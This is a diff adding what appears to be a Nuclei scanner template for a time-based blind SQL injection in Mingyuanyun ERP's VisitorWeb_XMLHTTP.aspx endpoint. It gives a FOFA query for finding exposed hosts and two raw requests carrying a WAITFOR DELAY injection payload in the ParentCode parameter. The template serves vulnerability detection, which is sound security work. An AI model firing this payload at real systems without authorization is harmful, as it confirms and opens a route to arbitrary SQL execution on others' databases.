@@ -1,0 +1,31 @@
+id: mingyuanyun-erp-visitorweb-xmlhttp-sqli
+
+info:
+  name: Mingyuanyun ERP VisitorWeb_XMLHTTP.aspx SQL Time-Based Blind Injection
+  author: Co5mos
+  severity: critical
+  description: |
+    Mingyuanyun ERP's `VisitorWeb_XMLHTTP.aspx` endpoint has a SQL time-based blind injection vulnerability that allows attackers to execute arbitrary SQL commands.
+  metadata:
+    fofa-query: app="明源云-ERP"
+  tags: mingyuanyun, sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:5'--&ywtype=GETParentProjectName HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 20s
+        GET /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:0'--&ywtype=GETParentProjectName HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - duration_1 >= 5 && duration_1 < 10
+          - duration_2 < 5
+        condition: and
